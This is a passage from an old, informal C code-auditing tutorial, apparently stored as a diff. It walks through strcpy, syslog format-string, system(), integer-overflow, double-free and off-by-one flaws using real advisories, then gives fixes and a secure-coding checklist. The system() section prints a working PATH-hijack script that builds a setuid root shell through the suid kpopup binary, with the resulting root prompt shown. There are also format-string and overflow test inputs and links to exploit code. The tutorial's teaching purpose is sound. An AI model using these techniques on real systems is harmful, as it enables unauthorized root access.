+                strcpy(portbuf, cp); // --> Copy cp into portbuf! =X!
+
+Now that one was alittle hard to grasp the first time around looking at it.. but once you put it together it should make
+sense and reveal the flaw, heh.
+
+Fixes? SAY PLEASE! Please. Ok =):
+
+1. Filter size of h (getenv("RSYNC_PROXY")).
+2. Use more bounds checking on the varibles in open_socket_out() altogether...
+3. Use bounds checking on where the overflow occurs of course..
+
+NOT: strcpy(portbuf, cp);
+
+USE: strlcpy(portbuf, cp, sizeof(portbuf));
+
+============================================================================================================================
+
+5.9 syslog() is a system logging function used to log data to syslogd, but without proper formatting a format string flaw
+may be triggered.
+
+And our syslog() example is.. Cherokee WebServer (Advisory: http://www.securityfocus.com/archive/1/360802).
+
+talon@quake:~/audit/cherokee-0.4.16/src$ ./cherokee
+Can't read the configuration file: '/usr/local/etc/cherokee/cherokee.conf'
+talon@quake:~/audit/cherokee-0.4.16/src$ ./cherokee -C "0x%x 0x%x 0x%x 0x%x 0x%x" // --> Teh Format Triggerz
+Can't read the configuration file: '0x%x 0x%x 0x%x 0x%x 0x%x'
+talon@quake:~/audit/cherokee-0.4.16/src$ tail /var/log/syslog
+Aug 22 07:23:56 quake modprobe: modprobe: Can't locate module sound-slot-0
+Aug 22 07:23:56 quake modprobe: modprobe: Can't locate module sound-service-0-0
+Aug 22 10:00:22 quake modprobe: modprobe: Can't locate module sound-slot-0
+Aug 22 10:00:22 quake modprobe: modprobe: Can't locate module sound-service-0-0
+Aug 22 10:00:23 quake modprobe: modprobe: Can't locate module sound-slot-0
+Aug 22 10:00:23 quake modprobe: modprobe: Can't locate module sound-service-0-3
+Aug 22 10:00:23 quake modprobe: modprobe: Can't locate module sound-slot-0
+Aug 22 10:00:23 quake modprobe: modprobe: Can't locate module sound-service-0-0
+Aug 22 10:07:42 quake lt-cherokee: Can't read the configuration file: '/usr/local/etc/cherokee/cherokee.conf'
+Aug 22 10:08:14 quake lt-cherokee: Can't read the configuration file: '0x804b9e0 0xbffff4c4 0x276e6143 0x65722074 0x74206461' // --> WHAT THAT!? MEMORY ADDRESSES!!!?? Hehe =).
+talon@quake:~/audit/cherokee-0.4.16/src$
+
+As you can see by the flawed syslog() call.. the format flawing data that is supposed to be the config file for Cherokee
+WebServer is logged to syslog without proper formatting. Fo Shizzle Yo. =p.
+
+The Code with the flawed syslog():
+
+void
+PRINT_ERROR (const char *format, ...)
+{
+        va_list arg_list;
+        CHEROKEE_TEMP(tmp, 2048);
+
+        va_start(arg_list, format);
+        vsnprintf (tmp, tmp_size, format, arg_list);
+        va_end(arg_list);
+
+        fprintf (stderr, "%s", tmp); // --> First print to stderr stream.
+        syslog (LOG_ERR, tmp); // --> THEN TO SYSLOG!!! =/.
+}
+
+Yo fixes? Once again, Yep, Hehe:
+
+1. Don't log it to syslog (lol).
+2. USE PROPER FORMATTING!!!
+
+NOT: syslog (LOG_ERR, tmp);
+
+USE: syslog (LOG_ERR, "%s", tmp);
+
+3. Follow 2 and you'll be fine ;).
+
+============================================================================================================================
+
+5.10 system() is a function that executes a command on the system, and without proper checks syntax, it can be a harzard to
+the system if suid or sgid.
+
+Our handy dandy system() example is Kpopup 0.9.1 (Advisory: http://securitytracker.com/alerts/2003/Oct/1008018.html).
+
+talon@quake:~/audit/kpopup-0.9.1$ pico /tmp/killall
+talon@quake:~/audit/kpopup-0.9.1$ chmod +x /tmp/killall
+talon@quake:~/audit/kpopup-0.9.1$ cat /tmp/killall
+#!/bin/sh
+cd /tmp
+/bin/cat > shell.c << EOF
+#include <stdio.h>
+
+#include <unistd.h>
+int main()
+{
+setuid(0);
+setgid(0);
+execl("/bin/sh", "sh", 0);
+return 0;
+}
+
+EOF
+/usr/bin/gcc /tmp/shell.c -o /tmp/shell
+/bin/chown root:root shell
+/bin/chmod 4755 shell
+/tmp/shell
+talon@quake:~/audit/kpopup-0.9.1$ export PATH=/tmp:/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:/usr/local/bin:/sbin
+:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin:/root/bin:
+talon@quake:~/audit/kpopup-0.9.1$ /opt/kde/bin/kpopup root shell
+fileerror!
+sh-2.05b# id
+uid=0(root) gid=0(root) groups=103(reflux),0(root),11(floppy),17(audio),18(video),19(cdrom)
+sh-2.05b# exit
+exit
+talon@quake:~/audit/kpopup-0.9.1$
+
+As you can see we just took advantage of some unsafe system() calls and gained a root shell from a suid kde binary, hehe.
+
+The CRAZY unsafe code:
+
+/*
+ * send signal for a new message
+ */
+void sendSignalForNewMessage() {
+    char command[50];
+
+    sprintf(command, "killall -USR1 kpopup"); // --> Put the shell command in command varible.
+    system(command); // --> Execute Command!
+}
+
+Now.. this at first may not look like anything at all.. but a closer look for would do some good, as the advisory explains
+much all of it.
+
+============================================================================================================================
+
+5.11 Integer overflows occur basically when the size of a integer is exceeded. Truthfully, alot of things about integer
+overflows I do not understand fully yet, but I will try to help you get a understanding of them and give you places to go
+to learn more about them if you choose.
+
+The example of an Integer Overflow we will talk about is one in the Linux Kernel's i2c Driver.
+
+The Vulnerable Code (Taken from the original advisory by shaun2k2 - http://www.securityfocus.com/archive/1/366198):
+
+ssize_t i2cproc_bus_read(struct file * file, char *buf,size_t count, loff_t *ppos)
+ {
+         struct inode * inode = file->f_dentry->d_inode;
+         char *kbuf;
+         struct i2c_client *client;
+         int i,j,k,order_nr,len=0;
+         size_t len_total;
+         int order[I2C_CLIENT_MAX];
+ 
+         if (count > 4000)
+                 return -EINVAL; 
+         len_total = file->f_pos + count;
+         /* Too bad if this gets longer (unlikely) */
+         if (len_total > 4000)
+                 len_total = 4000;
+         for (i = 0; i < I2C_ADAP_MAX; i++)
+                 if (adapters[i]->inode == inode->i_ino) {
+                 /* We need a bit of slack in the kernel buffer; this makes the sprintf safe. */
+                         if (! (kbuf = kmalloc(count + 80,GFP_KERNEL)))
+                                 return -ENOMEM;
+
+Now from the good explanation from shaun2k2 in his advisory, i've gathered this about the flaw:
+
+A quick check is made that 'count' does not exceed 4000.. but no checks are made if negative numbers and applied in 'count'.
+Also, since negative numbers become quite large when unsigned, a negative number would cause "unexpected behavior", and
+possibly a integer overflow. So if say -1 was applied to 'count' it would make 'count' 0xffffffff, and when added to 80 and
+kmalloc()'d, it would cause an integer overflow.
+
+Fixes? Yea, just make add a check that checks to make sure count does not become negative. It if trys to be, make it return
+"-EINVAL" ;). Alot of the times checks like that in code can make code alot more secure, really, you may be surprised =).
+
+============================================================================================================================
+
+5.12 Double free() bugs also aren't quite what i'd like to have in understanding, mainly because the few instances of them
+reported in code and the LARGE lack of texts explaning about them as well.
+
+As my understanding goes.. double free() bugs are when a chunk of memory is free()'d, and then a condition is made where it
+is free()'d again, an attacker can sometimes inject exploitation data and exploit the program.
+
+We will look at the CVS 1.11.4 double free() flaw explained very nicely by Igor Dobrovitski. He also written an exploit for
+the flaw, which can be attained at http://seclists.org/lists/bugtraq/2003/Feb/att-0042/cvs_sploit.c.
+
+Now, I will try to explain the flaw from which I gathered from his great advisory, considering him, like me, have seen a
+LARGE lack of texts or even explainations for double free() flaws. I hope to see someone to come up with a text so we all
+can learn from this fairly new and not well known way of exploitation.
+
+Basically, from reading the original advisory (http://securitytracker.com/alerts/2003/Jan/1005951.html), I gathered that by
+sending a malformed directory name it is possible to trigger an error that will return the code at a point where where a
+global pointer value has already been free()'d, and hasn't got a new assigned value yet. This will result in a double free()
+flaw when the next directory request is handled.
+
+I would show the code that identify's the flaw but I am unaware of it since it doesn't even tell the name of the file the
+flaw exists in, or a even a single identifying piece of code, I just wish as I said before this topic of vulnerability was
+MUCH MORE documented! =p.
+
+Still, what I would do to be identifying this kind of flaw is look for free()'s of course, and test and see what you can do
+to make the software free() the varible twice using the other details of the flaw and therefore see a bug.
+
+Fixes.. hmm.. well I suppose just watch your free()'s. If you see you can make an error in the software that makes it free()
+the varible or data again... add in a check or fix the code where it doesnt return or go on to free() the varible again, or
+something like that.
+
+============================================================================================================================
+
+5.13 Off-by-One bugs are basically just overflowing something like a varible by only one byte. This can be confusing to
+understand sometimes, and I admit even I am no expert on off-by-ones.
+
+Maybe this situation would be a good explanation:
+
+Say you have 10 students.
+
+Adam
+Bob
+Chris
+Diane
+Ethan
+Fred
+Ginger
+Hilary
+Ian
+Joesph
+
+Now how many people are between Diane and Ethan? You would use this formula: People Between D & E = Diane - Ethan, Correct?
+But that is the possible off-by-one. The answer *should* be People Between D & E = Diane - Ethan + 1, according to some
+text(s) i've read and the working math part of my brain agrees since the person who wrote the text obviously knows more
+than me (Wouldn't you know the text is http://www.textfiles.com/hacking/hakdic.txt, hehe).
+
+How about some code to live'in teh subject up:
+
+    /*
+     * Join the two strings together, ensuring that the right thing
+     * happens if the last component is empty, or the dirname is root.
+     */
+    if (resolved[0] == '/' && resolved[1] == '\0')
+        rootd = 1;
+    else
+        rootd = 0;
+
+    if (*wbuf) {
+        if (strlen(resolved) + strlen(wbuf) + rootd + 1 > MAXPATHLEN) {
+            errno = ENAMETOOLONG;
+            goto err1;
+        }
+        if (rootd == 0)
+            (void) strcat(resolved, "/");
+        (void) strcat(resolved, wbuf);
+    }
+
+This code was taken from the Wu-FTPd 2.5.0 - 2.6.1 off-by-one advisory (http://www.securityfocus.com/archive/1/331295).
+
+To possibly help you understand it abit more, lets break the code down abit.
+
+    if (resolved[0] == '/' && resolved[1] == '\0')
+        rootd = 1;
+
+If resolved[0] = / and resolved[1] = '\0' then rootd = 1.
+
+    else
+        rootd = 0;
+
+Else if not resolved[0] = / and resolved[1] = '\0' then rootd = 0.
+
+    if (*wbuf) {
+        if (strlen(resolved) + strlen(wbuf) + rootd + 1 > MAXPATHLEN) {
+            errno = ENAMETOOLONG;
+            goto err1;
+        }
+
+If 'wbuf' then if string length of 'resolved' + string length of wbuf + rootd + 1 is greater than MAXPATHLEN then errno =
+ENAMETOOLONG, goto err1.
+
+        if (rootd == 0)
+            (void) strcat(resolved, "/");
+        (void) strcat(resolved, wbuf);
+    }
+
+If rootd = 0, strcat / into resolved, strcat wbuf into resolved.
+
+From what I got from the advisory, the overflow occurs when the length of a path is equal to the MATHPATHLEN + 1 characters
+while the size of the buffer is MATHPATHLEN characters only. The main problem with the bug lies in that the miscalculation
+of the 'rootd' varible. As long as the buffer is not larger than the MAXPATHLEN characters, the bug is exploitable.
+
+As far as I can tell, this is even confusing to me a bit, but once one goes over the code and reads about it and looks
+through the exploit (http://packetstorm.linuxsecurity.com/0308-exploits/0x82-wu262.c) it gets easier to comprehend.
+
+Now for teh fix:
+
+1. As the fixed source uses (ftp://ftp.openbsd.org/pub/OpenBSD/src/lib/libc/stdlib/realpath.c), use strlcat() and not
+strcat(), because strlcat() uses good bounds checking as with the size of the MAXPATHLEN.
+
+============================================================================================================================
+
+6. I think some invulnerable examples would benefit the reader (you) as well. Now these examples may look vulnerable at
+first, but when looked at again and tested, are infact not.
+
+============================================================================================================================
+
+6.1 #1 example is this code:
+
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+
+char buffer[512];
+
+if(argc < 2) { return 0; }
+
+if(strlen(argv[1]) > sizeof(buffer))
+{
+
+printf("\nArgument is TOO LONG!\n\n");
+return 0;
+}
+
+strcpy(buffer, argv[1]);
+
+printf("\n%s\n\n", buffer);
+
+return 0;
+}
+
+See anything vulnerable? The strcpy() maybe? Ohhh.. well lets take a look and find out!
+
+talon@quake:~/audit$ ./1 `perl -e 'print "a" x 5'`
+
+aaaaa
+
+talon@quake:~/audit$ ./1 `perl -e 'print "a" x 50'`
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+talon@quake:~/audit$ ./1 `perl -e 'print "a" x 500'`
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaa
+
+talon@quake:~/audit$ ./1 `perl -e 'print "a" x 5000'`
+
+Argument is TOO LONG!
+
+talon@quake:~/audit$
+
+WHAT!? "Argument is TOO LONG!"? Where'd that come from!?
+
+if(strlen(argv[1]) > sizeof(buffer))
+{
+
+printf("\nArgument is TOO LONG!\n\n");
+return 0;
+}
+
+See? That those lines of code effectivly just stopped a buffer overflow from taking place.
+
+if(strlen(argv[1]) > sizeof(buffer))
+
+If the string length of argv[1] (The user's argument) is less greater than the size of the buffer,
+
+printf("\nArgument is TOO LONG!\n\n");
+return 0;
+}
+
+then print "Argument is TOO LONG!" and return 0.
+
+But what if the return 0 wasn't there in the correct place?:
+
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+
+char buffer[512];
+
+if(argc < 2) { return 0; }
+
+if(strlen(argv[1]) > sizeof(buffer))
+{
+
+printf("\nArgument is TOO LONG!\n\n");
+
+strcpy(buffer, argv[1]);
+
+printf("\n%s\n\n", buffer);
+
+return 0;
+}
+return 0;
+}
+
+talon@quake:~/audit$ ./1 `perl -e 'print "a" x 5000'`
+
+Argument is TOO LONG!
+
+
+.......... 5000 a's ..........
+
+Segmentation fault (core dumped)
+talon@quake:~/audit$ gdb -c core
+GNU gdb 6.1.1
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i486-slackware-linux".
+Core was generated by `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x61616161 in ?? () // --> Overwritten EIP Register
+(gdb) q
+talon@quake:~/audit$
+
+See if the return 0 wasn't in its correct place, it can cause trouble like above =X.
+
+============================================================================================================================
+
+6.2 Here is #2's example code:
+
+#include <stdio.h>
+
+int main()
+{
+
+char buf1[256], buf2[256];
+
+fgets(buf1, sizeof(buf1), stdin);
+
+sprintf(buf2, "%s", buf1);
+
+printf("\n%s\n", buf2);
+
+return 0;
+}
+
+Hey now... sprintf() if putting buf1 which it gets from the user into buf2.. looks like something fishy's going on here.
+
+Actually, no, lol. Since fgets() excellent syntax for bounds checking kicked in, it will only copy the maximum bytes that
+buf1 is defined as into buf1, and then buf1 into buf2. Since they are the same size, theres no problem:
+
+talon@quake:~/audit$ ./2
+aaaaa // --> 5 a's
+
+aaaaa // --> 5 a's
+
+talon@quake:~/audit$ perl -e 'print "a" x 300'
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatalon@quake:~/audit$
+talon@quake:~/audit$ ./2
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa // --> 300 a's
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaa // --> 256 a's
+talon@quake:~/audit$
+
+Nice, eh? =)
+
+============================================================================================================================
+
+6.3 Now for #3's example:
+
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[])
+{
+
+if(argc < 2) { return 0; }
+
+char buffer[64];
+
+if(strlen(argv[1]) > sizeof(buffer))
+{
+
+printf("\nnope =)\n\n");
+return 0;
+}
+
+if(strstr(argv[1], "%"))
+{
+
+printf("\nnope =)\n\n");
+return 0;
+}
+
+sprintf(buffer, "%s", argv[1]);
+
+printf("\n");
+printf(buffer);
+printf("\n\n");
+
+return 0;
+}
+
+Woah, a bit bigger than the other examples, hehe. Anyways... looking through the code.. O_o a fmt string in printf() and a
+buffer overflow in sprintf()???
+
+printf(buffer);
+
+sprintf(buffer, "%s", argv[1]);
+
+!!!???
+
+Well lets test and see...
+
+alon@quake:~/audit$ ./3 `perl -e 'print "A" x 100'`
+
+nope =)
+
+talon@quake:~/audit$ ./3 0x%x
+
+nope =)
+
+talon@quake:~/audit$ ./3 wtf?
+
+wtf?
+
+talon@quake:~/audit$
+
+Why is it telling us "nope =)"!? Ohhhhhh... didn't see those checks in there did we... =/.
+
+if(strlen(argv[1]) > sizeof(buffer))
+{
+
+printf("\nnope =)\n\n");
+return 0;
+}
+
+If the string length of argv[1] is larger than the size of the buffer, printf the msg and return 0. Dang =X.
+
+if(strstr(argv[1], "%"))
+{
+
+printf("\nnope =)\n\n");
+return 0;
+}
+
+If theres a '%' in argv[1], print the msg and return 0. Dang Again!!! =/.
+
+============================================================================================================================
+
+7. I decided to write alittle section with a checklist that should help you prevent some flaws in coding software in C.
+
+1. DO NOT use sprintf() (), use snprintf() - http://www.opengroup.org/onlinepubs/009695399/functions/snprintf.html
+
+2. DO NOT use strcat(), use strncat() - http://www.opengroup.org/onlinepubs/009695399/functions/strncat.html
+
+3. DO NOT use strcpy(), use strncpy() - http://www.opengroup.org/onlinepubs/007908799/xsh/strncpy.html
+
+4. DO NOT use system(), use the exec* family functions (execl(), execlp(), execve, etc).
+
+5. ALWAYS use proper formatting with using syslog() functions.
+
+6. ALWAYS use proper formatting with using printf(), fprintf(), rprintf(), cprintf(), sprintf(), etc.
+
+7. IF you ever use functions that do not use bounds checking or other checking for overflows or are prone to be used without
+proper formatting or validation make sure you add in checks and security tweaks yourself that should help.
+
+8. When working with integers or free()'ing data/varibles, make sure you check for positive and negative overflows, and you
+don't free() the same data/varible twice in the exploitation conditions.
+
+9. When using more secure functions like stated in 1, 2, 3, and 4, make sure the size of the data is what YOU say it is and
+check for overflows in the input and string copying.
+
+10. NEVER stop auditing your code, NEVER stop optimizing your code SAFELY, and NEVER think anything is 100% secure.
+
+If you follow that checklist you should be able to code fairly secure code, or atleast I hope you can, hehe.
+
+============================================================================================================================
+
+8. Now a list of my references in alphabetical order.
+
+www.derkeiler.com --> Some advisories, etc.
+www.dwheeler.com --> Hosting flawfinder site.
+www.google.com --> To look up and read various things.
+www.opengroup.com --> For their wonderful pages on C functions.
+www.priv8security.com --> For the LCDproc advisory and being cool peeps =).
+www.securesw.com --> For hosting RATS project and such, heh.
+www.securiteam.com --> Some advisories and stuff.
+www.securityfocus.com --> Having more great advisories and information like securitytracker but more ;).
+www.securitytracker.com --> Their good archive of advisories.
+www.sourceforge.net --> Having the biggest *nix software download place ever, hehe.
+www.textfiles.com --> Some nice texts and one I used for reference.
+
+And various other sites I used in google to make sure I didn't get anything wrong with this paper as far as I know, I thank
+you all for the information and great guidance =).
+
+============================================================================================================================
+
+9. Now for my greets and links.. greets will go first =).
+
+atomix - bl4ckf0g - brotroxer - bsdaemon - c0wboy - coideloko - d4rkeagle - d4rkgr3y - darksock - div0xx - h0snp - hexdump
+nas - omic - over_g - owlmanatt - ph0enix - phreaked - r4t - syke - syslogd - toxzic - vile - uberuser - wsxz - xaxisx - xdm
+
+And all the others I forgot.. ;P.
+
+Teh links in A-B-C orderz:
+
+0x333.org
+atomix.wtf.la
+bl4ckf0g.com
+cpu-museum.de
+debian.com
+freebsd.org
+hbx.us
+kernel.org
+k-otik.com
+m00.0x333.org
+openbsd.org
+opengroup.org
+priv8security.com
+reflux.dyndns.org
+securiteam.com
+securityfocus.com
+securitytracker.com
+slackware.org
+slashdot.org
+sourceforge.net
+uhagr.org
+zone-h.org
+
+============================================================================================================================
+
+10. Now finally.. the conclusion.. whew. Well, my conclusion is that code auditing is a challenge. If you want to find a
+hole, no matter if its opensource or not, download or get access to the software and just start trying to bash it. Push it
+to its limits, see how much it can take and if the programmers did a good job or a poor job. Take the source, open it, look
+at it, read it, understand it, put it all together and look for flaws. Just imagine, you may be the very one who discovers
+the next Apache flaw? The next kernel bug? The next vulnerability in a protocol? The possiblities are endless =).
+
+-Tal0n [cyber_talon@hotmail.com]
+
+AIM: unixroot102
+MSN: cyber_talon@hotmail.com
+IRC: irc.foxlink.net [Efnet] and irc.blackhat.ru [Diversity]
+
+============================================================================================================================
